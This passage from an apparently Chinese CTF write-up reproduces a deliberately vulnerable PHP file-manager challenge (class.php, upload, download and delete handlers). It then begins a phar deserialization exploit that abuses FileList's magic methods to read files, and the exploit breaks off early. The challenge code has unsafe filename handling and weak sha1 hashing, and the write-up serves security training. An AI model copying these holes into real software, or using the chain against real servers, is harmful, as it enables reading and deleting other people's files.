</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">user_exist</span>($username)) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        $password <span style="color:#f92672">=</span> <span style="color:#a6e22e">sha1</span>($password <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;SiAchGHmFx&#34;</span>);
</span></span><span style="display:flex;"><span>        $stmt <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">db</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">&#34;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&#34;</span>);
</span></span><span style="display:flex;"><span>        $stmt<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">bind_param</span>(<span style="color:#e6db74">&#34;ss&#34;</span>, $username, $password);
</span></span><span style="display:flex;"><span>        $stmt<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">execute</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">verify_user</span>($username, $password) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">user_exist</span>($username)) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        $password <span style="color:#f92672">=</span> <span style="color:#a6e22e">sha1</span>($password <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;SiAchGHmFx&#34;</span>);
</span></span><span style="display:flex;"><span>        $stmt <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">db</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">&#34;SELECT `password` FROM `users` WHERE `username` = ?;&#34;</span>);
</span></span><span style="display:flex;"><span>        $stmt<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">bind_param</span>(<span style="color:#e6db74">&#34;s&#34;</span>, $username);
</span></span><span style="display:flex;"><span>        $stmt<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">execute</span>();
</span></span><span style="display:flex;"><span>        $stmt<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">bind_result</span>($expect);
</span></span><span style="display:flex;"><span>        $stmt<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">fetch</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($expect) <span style="color:#f92672">&amp;&amp;</span> $expect <span style="color:#f92672">===</span> $password) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__destruct</span>() {
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">db</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">close</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">FileList</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $files;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $results;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $funcs;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__construct</span>($path) {
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">files</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">results</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">funcs</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
</span></span><span style="display:flex;"><span>        $filenames <span style="color:#f92672">=</span> <span style="color:#a6e22e">scandir</span>($path);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        $key <span style="color:#f92672">=</span> <span style="color:#a6e22e">array_search</span>(<span style="color:#e6db74">&#34;.&#34;</span>, $filenames);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">unset</span>($filenames[$key]);
</span></span><span style="display:flex;"><span>        $key <span style="color:#f92672">=</span> <span style="color:#a6e22e">array_search</span>(<span style="color:#e6db74">&#34;..&#34;</span>, $filenames);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">unset</span>($filenames[$key]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">foreach</span> ($filenames <span style="color:#66d9ef">as</span> $filename) {
</span></span><span style="display:flex;"><span>            $file <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">File</span>();
</span></span><span style="display:flex;"><span>            $file<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">open</span>($path <span style="color:#f92672">.</span> $filename);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">array_push</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">files</span>, $file);
</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">results</span>[$file<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span>()] <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__call</span>($func, $args) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">array_push</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">funcs</span>, $func);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">foreach</span> ($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">files</span> <span style="color:#66d9ef">as</span> $file) {
</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">results</span>[$file<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span>()][$func] <span style="color:#f92672">=</span> $file<span style="color:#f92672">-&gt;</span>$func();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__destruct</span>() {
</span></span><span style="display:flex;"><span>        $table <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;div id=&#34;container&#34; class=&#34;container&#34;&gt;&lt;div class=&#34;table-responsive&#34;&gt;&lt;table id=&#34;table&#34; class=&#34;table table-bordered table-hover sm-font&#34;&gt;&#39;</span>;
</span></span><span style="display:flex;"><span>        $table <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#39;&lt;thead&gt;&lt;tr&gt;&#39;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">foreach</span> ($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">funcs</span> <span style="color:#66d9ef">as</span> $func) {
</span></span><span style="display:flex;"><span>            $table <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#39;&lt;th scope=&#34;col&#34; class=&#34;text-center&#34;&gt;&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">htmlentities</span>($func) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;&lt;/th&gt;&#39;</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        $table <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#39;&lt;th scope=&#34;col&#34; class=&#34;text-center&#34;&gt;Opt&lt;/th&gt;&#39;</span>;
</span></span><span style="display:flex;"><span>        $table <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#39;&lt;/thead&gt;&lt;tbody&gt;&#39;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">foreach</span> ($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">results</span> <span style="color:#66d9ef">as</span> $filename <span style="color:#f92672">=&gt;</span> $result) {
</span></span><span style="display:flex;"><span>            $table <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#39;&lt;tr&gt;&#39;</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">foreach</span> ($result <span style="color:#66d9ef">as</span> $func <span style="color:#f92672">=&gt;</span> $value) {
</span></span><span style="display:flex;"><span>                $table <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#39;&lt;td class=&#34;text-center&#34;&gt;&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">htmlentities</span>($value) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;&lt;/td&gt;&#39;</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            $table <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#39;&lt;td class=&#34;text-center&#34; filename=&#34;&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">htmlentities</span>($filename) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;&#34;&gt;&lt;a href=&#34;#&#34; class=&#34;download&#34;&gt;下载&lt;/a&gt; / &lt;a href=&#34;#&#34; class=&#34;delete&#34;&gt;删除&lt;/a&gt;&lt;/td&gt;&#39;</span>;
</span></span><span style="display:flex;"><span>            $table <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#39;&lt;/tr&gt;&#39;</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> $table;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">File</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $filename;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">open</span>($filename) {
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">filename</span> <span style="color:#f92672">=</span> $filename;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">file_exists</span>($filename) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">is_dir</span>($filename)) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">name</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">basename</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">filename</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">size</span>() {
</span></span><span style="display:flex;"><span>        $size <span style="color:#f92672">=</span> <span style="color:#a6e22e">filesize</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">filename</span>);
</span></span><span style="display:flex;"><span>        $units <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39; B&#39;</span>, <span style="color:#e6db74">&#39; KB&#39;</span>, <span style="color:#e6db74">&#39; MB&#39;</span>, <span style="color:#e6db74">&#39; GB&#39;</span>, <span style="color:#e6db74">&#39; TB&#39;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> ($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $size <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">1024</span> <span style="color:#f92672">&amp;&amp;</span> $i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">4</span>; $i<span style="color:#f92672">++</span>) $size <span style="color:#f92672">/=</span> <span style="color:#ae81ff">1024</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">round</span>($size, <span style="color:#ae81ff">2</span>)<span style="color:#f92672">.</span>$units[$i];
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">detele</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">unlink</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">filename</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">close</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">file_get_contents</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">filename</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>upload.php：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">session_start</span>();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_SESSION[<span style="color:#e6db74">&#39;login&#39;</span>])) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: login.php&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>();
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#34;class.php&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_FILES[<span style="color:#e6db74">&#34;file&#34;</span>])) {
</span></span><span style="display:flex;"><span>    $filename <span style="color:#f92672">=</span> $_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;name&#34;</span>];
</span></span><span style="display:flex;"><span>    $pos <span style="color:#f92672">=</span> <span style="color:#a6e22e">strrpos</span>($filename, <span style="color:#e6db74">&#34;.&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($pos <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>) {
</span></span><span style="display:flex;"><span>        $filename <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>($filename, <span style="color:#ae81ff">0</span>, $pos);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    $fileext <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.gif&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span> ($_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;type&#34;</span>]) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;image/gif&#39;</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            $fileext <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.gif&#34;</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;image/jpeg&#39;</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            $fileext <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.jpg&#34;</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;image/png&#39;</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            $fileext <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.png&#34;</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            $response <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;success&#34;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">false</span>, <span style="color:#e6db74">&#34;error&#34;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;Only gif/jpg/png allowed&#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">Header</span>(<span style="color:#e6db74">&#34;Content-type: application/json&#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">json_encode</span>($response);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">die</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strlen</span>($filename) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">40</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">strlen</span>($filename) <span style="color:#f92672">!==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        $dst <span style="color:#f92672">=</span> $_SESSION[<span style="color:#e6db74">&#39;sandbox&#39;</span>] <span style="color:#f92672">.</span> $filename <span style="color:#f92672">.</span> $fileext;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">move_uploaded_file</span>($_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;tmp_name&#34;</span>], $dst);
</span></span><span style="display:flex;"><span>        $response <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;success&#34;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">true</span>, <span style="color:#e6db74">&#34;error&#34;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">Header</span>(<span style="color:#e6db74">&#34;Content-type: application/json&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">json_encode</span>($response);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        $response <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;success&#34;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">false</span>, <span style="color:#e6db74">&#34;error&#34;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;Invaild filename&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">Header</span>(<span style="color:#e6db74">&#34;Content-type: application/json&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">json_encode</span>($response);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>download.php：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">session_start</span>();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_SESSION[<span style="color:#e6db74">&#39;login&#39;</span>])) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: login.php&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>();
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;filename&#39;</span>])) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>();
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#34;class.php&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ini_set</span>(<span style="color:#e6db74">&#34;open_basedir&#34;</span>, <span style="color:#a6e22e">getcwd</span>() <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;:/etc:/tmp&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">chdir</span>($_SESSION[<span style="color:#e6db74">&#39;sandbox&#39;</span>]);
</span></span><span style="display:flex;"><span>$file <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">File</span>();
</span></span><span style="display:flex;"><span>$filename <span style="color:#f92672">=</span> (<span style="color:#a6e22e">string</span>) $_POST[<span style="color:#e6db74">&#39;filename&#39;</span>];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strlen</span>($filename) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">40</span> <span style="color:#f92672">&amp;&amp;</span> $file<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">open</span>($filename) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">stristr</span>($filename, <span style="color:#e6db74">&#34;flag&#34;</span>) <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Header</span>(<span style="color:#e6db74">&#34;Content-type: application/octet-stream&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Header</span>(<span style="color:#e6db74">&#34;Content-Disposition: attachment; filename=&#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">basename</span>($filename));
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> $file<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">close</span>();
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;File not exist&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>delete.php：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">session_start</span>();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_SESSION[<span style="color:#e6db74">&#39;login&#39;</span>])) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: login.php&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>();
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;filename&#39;</span>])) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>();
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#34;class.php&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">chdir</span>($_SESSION[<span style="color:#e6db74">&#39;sandbox&#39;</span>]);
</span></span><span style="display:flex;"><span>$file <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">File</span>();
</span></span><span style="display:flex;"><span>$filename <span style="color:#f92672">=</span> (<span style="color:#a6e22e">string</span>) $_POST[<span style="color:#e6db74">&#39;filename&#39;</span>];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strlen</span>($filename) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">40</span> <span style="color:#f92672">&amp;&amp;</span> $file<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">open</span>($filename)) {
</span></span><span style="display:flex;"><span>    $file<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">detele</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Header</span>(<span style="color:#e6db74">&#34;Content-type: application/json&#34;</span>);
</span></span><span style="display:flex;"><span>    $response <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;success&#34;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">true</span>, <span style="color:#e6db74">&#34;error&#34;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">json_encode</span>($response);
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Header</span>(<span style="color:#e6db74">&#34;Content-type: application/json&#34;</span>);
</span></span><span style="display:flex;"><span>    $response <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;success&#34;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">false</span>, <span style="color:#e6db74">&#34;error&#34;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;File not exist&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">json_encode</span>($response);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>根据class.php进行phar的构造：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $db;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">FileList</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $files;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $results;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $funcs;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__construct</span>() {
